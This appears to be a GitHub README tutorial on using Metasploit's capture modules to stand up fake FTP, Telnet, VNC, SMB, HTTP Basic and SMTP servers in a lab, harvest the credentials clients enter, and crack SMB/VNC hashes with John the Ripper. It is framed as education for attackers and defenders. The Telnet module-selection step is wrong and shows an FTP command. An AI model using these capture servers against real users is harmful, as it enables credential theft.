# Metasploit_Fake_services
# Capturing FTP Credentials with Metasploit

This repository contains a detailed guide on using the Metasploit framework to capture credentials by setting up fake servers for various protocols. The goal is to demonstrate how attackers can use Metasploit's auxiliary modules to gather credentials and how defenders can understand and mitigate such attacks.

## Table of Contents

- [Introduction](#introduction)
- [Requirements](#requirements)
- [Setup](#setup)
- [Configuration , Exploitation and Verification](#Configuration,Exploitation_and_Verification)

## Introduction

This guide explains how to use Metasploit's auxiliary modules to set up fake servers and capture credentials from unsuspecting victims. The process includes configuring the Metasploit modules, launching the fake servers, and using various tools to test the setup.

## Requirements

- Metasploit Framework installed
- Kali Linux or any Linux distribution with Metasploit
- Basic understanding of various network protocols and Metasploit

## Setup

1. **Install Metasploit Framework** (if not already installed):

    ```bash
    sudo apt update
    sudo apt install metasploit-framework
    ```
2. **Start Metasploit Console**:

    ```bash
    msfconsole
    ```
    ## Configuration , Exploitation and Verification

### FTP

1. **Select the FTP Capture Module**:

    ```bash
    use auxiliary/server/capture/ftp
    ```

2. **Set the Server Host**:

    ```bash
    set SRVHOST 192.168.23.149
    ```

3. **Set a Custom Banner**:

    ```bash
    set BANNER "Welcome"
    ```

4. **Launch the Fake FTP Server**:

    ```bash
    exploit
    ```

5. **Verify the Fake Server is Running**:

    Use Nmap to scan for the open FTP port (21):

    ```bash
    nmap -p21 192.168.23.149
    ```

6. **Connect to the Fake FTP Server**:

    Use an FTP client to connect to the fake server:

    ```bash
    ftp 192.168.23.149
    ```

7. **Enter Username and Password**:

    When prompted, enter any username and password. These credentials will be captured by the fake server.

8. **Check Captured Credentials**:

    In the Metasploit console, view the captured credentials:

    ```bash
    [+] FTP LOGIN 192.168.23.149:37216 ahmed / hello friend
    ```

    You should see the username and password entered during the FTP connection.

   ### Telnet

   1. **Select The Telnet Capture Module** :

    ```bash
    ftp 192.168.23.149
    ```
   2. **Set the Server Host**:

    ```bash
    set SRVHOST 192.168.23.149
    ```

3. **Launch the Fake Telnet Server**:

    ```bash
    exploit
    ```

4. **Verify the Fake Server is Running** :

   Use Nmap to scan for the open FTP port (23):

     ```bash
    nmap -p23 192.168.23.149
    ```

4. **Connect using a Telnet Client**:

    ```bash
    telnet 192.168.23.149
    ```

5. **Enter Username and Password**:

    The credentials will be captured by the fake server.

### VNC

1. **Select the VNC Capture Module**:

    ```bash
    use auxiliary/server/capture/vnc
    ```

2. **Set the Server Host**:

    ```bash
    set SRVHOST 192.168.23.149
    ```

3. **Save Captured Hashes**:

    Set the `johnpwfile` option to save the captured hashes in John the Ripper format:

    ```bash
    set JOHNPWFILE /root/Desktop/
    ```

4. **Launch the Fake VNC Server**:

    ```bash
    exploit
    ```

5. **Connect using a VNC Client**:

    ```bash
    vncviewer 192.168.23.149
    ```
The VNC client will attempt to authenticate, and the credentials will be captured and saved in the specified file.

### SMB

1. **Select the SMB Capture Module**:

    ```bash
    use auxiliary/server/capture/smb
    ```

2. **Set the Server Host**:

    ```bash
    set SRVHOST 192.168.23.149
    ```

3. **Save Captured Hashes**:

    ```bash
    set JOHNPWFILE /root/Desktop/
    ```

4. **Launch the Fake SMB Server**:

    ```bash
    exploit
    ```

5. **Access the SMB Share**:

    Use an SMB client or simply try to map the share from another machine. The credentials will be captured and saved in the specified file.

6. **Decrypt the Captured Hashes**:

    Use John the Ripper to decrypt the captured hashes:

    ```bash
    john <The captured hash file>
    ```
### HTTP Basic

1. **Select the HTTP Basic Auth Capture Module**:

    ```bash
    use auxiliary/server/capture/http_basic
    ```

2. **Set the Server Host**:

    ```bash
    set SRVHOST 192.168.23.149
    ```

3. **Launch the Fake HTTP Server**:

    ```bash
    exploit
    ```

4. **Access the HTTP Server**:

    Use a web browser or HTTP client to access the server, and enter credentials when prompted. These will be captured by the fake server.

### SMTP

1. **Select the SMTP Capture Module**:

    ```bash
    use auxiliary/server/capture/smtp
    ```

2. **Set the Server Host**:

    ```bash
    set SRVHOST 192.168.23.149
    ```

3. **Launch the Fake SMTP Server**:

    ```bash
    exploit
    ```

4. **Verify the Fake Server is Running**:

    Use Nmap to scan for the open SMTP port (25):

    ```bash
    nmap -p25 192.168.23.149
    ```

5. **Connect using Telnet**:

    ```bash
    telnet 192.168.23.149 25
    ```

6. **Send a Test Email**:

    Write and send the following email:

    ```plaintext
    Objet : Urgent : Réunion d'urgence à 15h aujourd'hui

    Bonjour à tous,

    Je vous écris pour vous informer qu'une réunion d'urgence aura lieu aujourd'hui à 15h dans la salle de conférence principale. La présence de chacun est indispensable.

    Cordialement,

    Ahmed
    ```

    The SMTP credentials used to send the email will be captured by the fake server.
